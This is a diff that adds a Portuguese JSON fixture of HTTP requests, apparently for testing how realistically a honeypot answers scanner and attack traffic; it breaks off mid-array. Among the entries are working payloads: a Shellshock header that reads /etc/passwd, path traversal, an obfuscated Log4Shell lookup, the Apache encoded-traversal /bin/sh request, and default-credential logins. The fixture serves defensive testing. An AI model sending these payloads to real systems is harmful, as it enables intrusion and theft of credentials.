@@ -1,0 +1,1204 @@
+[
+ {
+  "id": "R01",
+  "grupo": "controle",
+  "descricao": "Pagina raiz",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "<html",
+    "<body",
+    "<title",
+    "<div",
+    "<h[1-6]"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET / HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html"
+ },
+ {
+  "id": "R02",
+  "grupo": "controle",
+  "descricao": "Vazamento de .env",
+  "categoria": "Exfiltracao",
+  "metodo": "GET",
+  "path": "/.env",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "application/octet-stream",
+   "application/x-env"
+  ],
+  "realismo": {
+   "expects": [
+    "[A-Z_]+\\s*=",
+    "(?i)(DB_|API|SECRET|PASS|KEY|TOKEN|HOST|USER)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /.env HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: curl/7.88.1\nAccept: */*"
+ },
+ {
+  "id": "R03",
+  "grupo": "controle",
+  "descricao": "WordPress admin scan",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/wp-admin/",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)<form",
+    "(?i)(user|log|pwd|pass)",
+    "(?i)wordpress|wp-"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /wp-admin/ HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0\nAccept: text/html"
+ },
+ {
+  "id": "R04",
+  "grupo": "controle",
+  "descricao": "Login WordPress (POST)",
+  "categoria": "Brute-force",
+  "metodo": "POST",
+  "path": "/wp-login.php",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html",
+   "application/x-www-form-urlencoded"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)<form",
+    "(?i)(username|password|log|pwd)",
+    "(?i)(incorrect|invalid|error|dashboard|welcome)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "POST /wp-login.php HTTP/1.1\nHost: 203.0.113.10\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 47\n\nlog=admin&pwd=admin123&wp-submit=Log+In"
+ },
+ {
+  "id": "R05",
+  "grupo": "controle",
+  "descricao": "phpinfo()",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/phpinfo.php",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)php\\s*version",
+    "(?i)(system|build date|configure|apache|server api)",
+    "(?i)<table"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /phpinfo.php HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0\nAccept: text/html"
+ },
+ {
+  "id": "R06",
+  "grupo": "controle",
+  "descricao": "Exposicao de .git/config",
+  "categoria": "Exfiltracao",
+  "metodo": "GET",
+  "path": "/.git/config",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "\\[core\\]",
+    "(?i)\\[remote",
+    "(?i)(url|repositoryformatversion|fetch)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /.git/config HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\nAccept: */*"
+ },
+ {
+  "id": "R07",
+  "grupo": "controle",
+  "descricao": "API REST JSON",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/api/v1/users",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)(id|user|name|email|username)",
+    "[\\[{]",
+    ":"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /api/v1/users HTTP/1.1\nHost: 203.0.113.10\nAccept: application/json\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
+ },
+ {
+  "id": "R08",
+  "grupo": "controle",
+  "descricao": "Painel admin PHP",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/admin/config.php",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html",
+   "text/plain",
+   "text",
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)<form",
+    "(?i)(admin|login|user|pass|config|dashboard)",
+    "(?i)(<input|<html|<div)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /admin/config.php HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: sqlmap/1.7\nAccept: */*"
+ },
+ {
+  "id": "R09",
+  "grupo": "controle",
+  "descricao": "Shellshock / CGI",
+  "categoria": "Exploracao",
+  "metodo": "GET",
+  "path": "/cgi-bin/test.cgi",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "text/html",
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)(root:|/bin/|/home/|:x:|daemon:)",
+    "(?i)(uid|gid|shell|bash)",
+    ":"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /cgi-bin/test.cgi HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: () { :; }; echo; /bin/cat /etc/passwd\nAccept: */*"
+ },
+ {
+  "id": "R10",
+  "grupo": "controle",
+  "descricao": "Login API JSON (POST)",
+  "categoria": "Brute-force",
+  "metodo": "POST",
+  "path": "/api/login",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)(token|jwt|session|auth|status|error|success|message)",
+    "[{\\[]",
+    ":"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "POST /api/login HTTP/1.1\nHost: 203.0.113.10\nContent-Type: application/json\nContent-Length: 44\n\n{\"username\": \"admin\", \"password\": \"admin\"}"
+ },
+ {
+  "id": "R11",
+  "grupo": "controle",
+  "descricao": "Arquivo de backup",
+  "categoria": "Exfiltracao",
+  "metodo": "GET",
+  "path": "/backup.sql",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "application/sql",
+   "application/octet-stream",
+   "application/x-sql"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)(CREATE TABLE|INSERT INTO|DROP TABLE|VALUES|DATABASE)",
+    "(?i)(PRIMARY KEY|VARCHAR|INT|NOT NULL)",
+    ";"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /backup.sql HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: python-requests/2.31.0\nAccept: */*"
+ },
+ {
+  "id": "R12",
+  "grupo": "controle",
+  "descricao": "Path traversal",
+  "categoria": "Exploracao",
+  "metodo": "GET",
+  "path": "/../../../../etc/passwd",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "text/html",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "root:.*:0:0:",
+    "(?i)(/bin/|/home/|:x:|nologin|daemon:|/sbin/)",
+    ":"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /../../../../etc/passwd HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0\nAccept: */*"
+ },
+ {
+  "id": "R13",
+  "grupo": "controle",
+  "descricao": "phpMyAdmin",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/phpmyadmin/",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)phpmyadmin",
+    "(?i)<form",
+    "(?i)(user|pass|server|database|mysql)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /phpmyadmin/ HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0\nAccept: text/html"
+ },
+ {
+  "id": "R14",
+  "grupo": "controle",
+  "descricao": "Web shell",
+  "categoria": "Exploracao",
+  "metodo": "GET",
+  "path": "/shell.php",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html",
+   "text/plain",
+   "text"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)<form",
+    "(?i)(cmd|command|execute|shell|input|\\$)",
+    "(?i)(<input|<textarea|<pre)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /shell.php HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0\nAccept: text/html"
+ },
+ {
+  "id": "T01",
+  "grupo": "trafego_real",
+  "descricao": "raiz (13684 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "<html",
+    "<body",
+    "<title",
+    "<div",
+    "<h[1-6]"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET / HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T02",
+  "grupo": "trafego_real",
+  "descricao": "favicon (5375 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/favicon.ico",
+  "esperado": "cache",
+  "content_types_aceitos": [
+   "image/x-icon",
+   "image/vnd.microsoft.icon",
+   "image/png"
+  ],
+  "realismo": null,
+  "requisicao_http": "GET /favicon.ico HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T03",
+  "grupo": "trafego_real",
+  "descricao": "robots (682 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/robots.txt",
+  "esperado": "cache",
+  "content_types_aceitos": [
+   "text/plain",
+   "text"
+  ],
+  "realismo": null,
+  "requisicao_http": "GET /robots.txt HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T04",
+  "grupo": "trafego_real",
+  "descricao": "sitemap (592 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/sitemap.xml",
+  "esperado": "cache",
+  "content_types_aceitos": [
+   "application/xml",
+   "text/xml"
+  ],
+  "realismo": null,
+  "requisicao_http": "GET /sitemap.xml HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T05",
+  "grupo": "trafego_real",
+  "descricao": "security.txt (342 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/security.txt",
+  "esperado": "cache",
+  "content_types_aceitos": [
+   "text/plain",
+   "text"
+  ],
+  "realismo": null,
+  "requisicao_http": "GET /security.txt HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T06",
+  "grupo": "trafego_real",
+  "descricao": "mcp (637 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/sse",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/event-stream",
+   "application/json",
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)(event|data):",
+    "(?i)(mcp|jsonrpc|protocol|session|endpoint)",
+    "[{\\[]"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /sse HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: text/event-stream"
+ },
+ {
+  "id": "T07",
+  "grupo": "trafego_real",
+  "descricao": "wp-login (92 ips)",
+  "categoria": "Brute-force",
+  "metodo": "GET",
+  "path": "/wp-login.php",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)<form",
+    "(?i)(user|log|pwd|pass)",
+    "(?i)wordpress|wp-"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /wp-login.php HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T08",
+  "grupo": "trafego_real",
+  "descricao": "login-generico (381 ips)",
+  "categoria": "Brute-force",
+  "metodo": "GET",
+  "path": "/login",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)<form",
+    "(?i)(user|pass|login|email)",
+    "(?i)(<input|<button)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /login HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T09",
+  "grupo": "trafego_real",
+  "descricao": "wp-json (38 ips)",
+  "categoria": "Recon",
+  "metodo": "POST",
+  "path": "/wp-json/batch/v1",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "[{\\[]",
+    "(?i)(id|code|message|data|rest)",
+    ":"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "POST /wp-json/batch/v1 HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json\nContent-Type: application/json\nContent-Length: 53\n\n{\"requests\":[{\"path\":\"/wp/v2/users\",\"method\":\"GET\"}]}"
+ },
+ {
+  "id": "T10",
+  "grupo": "trafego_real",
+  "descricao": "feed (73 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/feed/",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/rss+xml",
+   "application/xml",
+   "text/xml",
+   "application/atom+xml"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)<rss|<feed|<\\?xml",
+    "(?i)(<item|<entry|<channel)",
+    "(?i)(<title|<link)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /feed/ HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T11",
+  "grupo": "trafego_real",
+  "descricao": "swagger (52 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/swagger.json",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)(swagger|openapi)",
+    "(?i)(paths|info|version)",
+    "[{\\[]"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /swagger.json HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "T12",
+  "grupo": "trafego_real",
+  "descricao": "version (288 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/version",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json",
+   "text/plain",
+   "text"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)version",
+    "[{\\[]|\\d+\\.\\d+",
+    "(?i)(build|git|go|api|platform|major|minor)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /version HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "T13",
+  "grupo": "trafego_real",
+  "descricao": "config.json (173 ips)",
+  "categoria": "Exfiltracao",
+  "metodo": "GET",
+  "path": "/config.json",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "[{\\[]",
+    "(?i)(host|port|url|key|secret|pass|token|user|db)",
+    ":"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /config.json HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "T14",
+  "grupo": "trafego_real",
+  "descricao": "wp-config.bak (52 ips)",
+  "categoria": "Exfiltracao",
+  "metodo": "GET",
+  "path": "/wp-config.php.bak",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "application/octet-stream",
+   "application/x-php"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)define\\s*\\(",
+    "(?i)(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)",
+    "<\\?php"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /wp-config.php.bak HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T15",
+  "grupo": "trafego_real",
+  "descricao": ".git (104 ips)",
+  "categoria": "Exfiltracao",
+  "metodo": "GET",
+  "path": "/.git/config",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "\\[core\\]",
+    "(?i)\\[remote",
+    "(?i)(url|repositoryformatversion|fetch)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /.git/config HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T16",
+  "grupo": "trafego_real",
+  "descricao": ".env (45 ips)",
+  "categoria": "Exfiltracao",
+  "metodo": "GET",
+  "path": "/.env",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "application/octet-stream",
+   "application/x-env"
+  ],
+  "realismo": {
+   "expects": [
+    "[A-Z_]+\\s*=",
+    "(?i)(DB_|API|SECRET|PASS|KEY|TOKEN|HOST|USER)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /.env HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T17",
+  "grupo": "trafego_real",
+  "descricao": "k8s (127 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/healthz",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "application/json",
+   "text"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)\\bok\\b|healthy|\\{",
+    "(?i)(status|kubelet|pods|node|ok)"
+   ],
+   "min_hits": 1,
+   "min_len": 2
+  },
+  "requisicao_http": "GET /healthz HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "T18",
+  "grupo": "trafego_real",
+  "descricao": "camera (83 ips)",
+  "categoria": "Recon",
+  "metodo": "POST",
+  "path": "/sdk",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/xml",
+   "text/xml",
+   "application/json",
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)(<\\?xml|\\{)",
+    "(?i)(device|camera|dvr|sdk|status|result|session)",
+    "(?i)(model|name|version|serial)"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "POST /sdk HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*\nContent-Type: application/xml\nContent-Length: 40\n\n<?xml version=\"1.0\"?><SDK><Login/></SDK>"
+ },
+ {
+  "id": "T19",
+  "grupo": "trafego_real",
+  "descricao": "aleatorio (109 ips)",
+  "categoria": "Exploracao",
+  "metodo": "GET",
+  "path": "/%23",
+  "esperado": "404",
+  "content_types_aceitos": [
+   "text/html",
+   "text/plain",
+   "text"
+  ],
+  "realismo": null,
+  "requisicao_http": "GET /%23 HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "T20",
+  "grupo": "trafego_real",
+  "descricao": "log4shell (header ofuscado)",
+  "categoria": "Exploracao",
+  "metodo": "GET",
+  "path": "/",
+  "esperado": "200-generico",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "<html",
+    "<body",
+    "<title",
+    "<div",
+    "<h[1-6]"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET / HTTP/1.1\nHost: 203.0.113.10\nAccept: */*\nUser-Agent: ${${12p:z5q:rp5:-j}${m:sy:91r0:-n}${2:q5sg:riya:-d}${q9d4:-i}${tne:-:}${d:279:-l}${dz4e:v9o:-d}${rfg:-a}${cgd:-p}${j3:4gy:pb:-:}${1:-/}${u2:-/}${z:-U}${z0q:-A}${y:n7:dj:-l}${gv9:0v:7r:-0}${a:-c}${jbk4:tsfo:--}${${x:9:-s}${8:u2sv:4uh:-y}${o:a:yg:-s}${kr2:-:}${in:o:-j}${lgq:kj:-a}${oc:-v}${xu65:-a}${fx5b:-.}${hi:-v}${o:mygz:oh:-e}${7fbs:-r}${uz:isx9:p:-s}${lukh:mf97:6f:-i}${b:knju:-o}${t1:e:qs:-n}}${ac:eiho:29:-.}${cd1:l:mnl:-2}${liz:bw:-7}}"
+ },
+ {
+  "id": "V01",
+  "grupo": "validacao",
+  "descricao": "POST raiz (2875 ips)",
+  "categoria": "Recon",
+  "metodo": "POST",
+  "path": "/",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "<html",
+    "<body",
+    "<title",
+    "<div",
+    "<h[1-6]"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "POST / HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: text/html\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 3\n\na=1"
+ },
+ {
+  "id": "V02",
+  "grupo": "validacao",
+  "descricao": "wsman WinRM (1730 ips)",
+  "categoria": "Recon",
+  "metodo": "POST",
+  "path": "/wsman",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/soap+xml",
+   "application/xml",
+   "text/xml",
+   "text/html",
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)<s:Envelope|<soap|<Envelope",
+    "(?i)wsman|ws-management|winrm",
+    "(?i)fault|unauthorized|401|Identify"
+   ],
+   "min_hits": 1,
+   "min_len": 20
+  },
+  "requisicao_http": "POST /wsman HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/soap+xml\nContent-Type: application/soap+xml;charset=UTF-8\nContent-Length: 84\n\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"><s:Body/></s:Envelope>"
+ },
+ {
+  "id": "V03",
+  "grupo": "validacao",
+  "descricao": "kubelet /pods (1124 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/pods",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json",
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "\"kind\"\\s*:\\s*\"PodList\"",
+    "\"items\"",
+    "\"metadata\"",
+    "(?i)unauthorized"
+   ],
+   "min_hits": 1,
+   "min_len": 12
+  },
+  "requisicao_http": "GET /pods HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V04",
+  "grupo": "validacao",
+  "descricao": "D-Link HNAP1 (726 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/HNAP1",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/soap+xml",
+   "application/xml",
+   "text/xml",
+   "xml",
+   "text/html",
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)<soap|<Envelope",
+    "(?i)HNAP|GetDeviceSettings",
+    "(?i)ModelName|FirmwareVersion|VendorName"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /HNAP1 HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "V05",
+  "grupo": "validacao",
+  "descricao": "Synology webapi (569 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/webapi/entry.cgi?api=SYNO.API.Info&version=1&method=query",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "\"success\"",
+    "\"error\"|\"data\"",
+    "(?i)SYNO\\.|code"
+   ],
+   "min_hits": 2,
+   "min_len": 15
+  },
+  "requisicao_http": "GET /webapi/entry.cgi?api=SYNO.API.Info&version=1&method=query HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V06",
+  "grupo": "validacao",
+  "descricao": "WP theme readme (517 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/wp-content/themes/twentyeleven/readme.txt",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)twenty ?eleven",
+    "(?i)contributors|tags|requires|tested|license",
+    "==="
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /wp-content/themes/twentyeleven/readme.txt HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "V07",
+  "grupo": "validacao",
+  "descricao": "Docker API containers (503 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/containers/json",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json",
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "^\\s*\\[",
+    "\"Id\"|\"Image\"|\"Names\"|\"State\"",
+    "(?i)page not found|404"
+   ],
+   "min_hits": 1,
+   "min_len": 2
+  },
+  "requisicao_http": "GET /containers/json HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V08",
+  "grupo": "validacao",
+  "descricao": "Apache traversal RCE (492 ips)",
+  "categoria": "Exploracao",
+  "metodo": "POST",
+  "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "application/octet-stream",
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "uid=\\d+\\(",
+    "gid=\\d+",
+    "(?i)www-data|apache|daemon|nobody"
+   ],
+   "min_hits": 2,
+   "min_len": 10
+  },
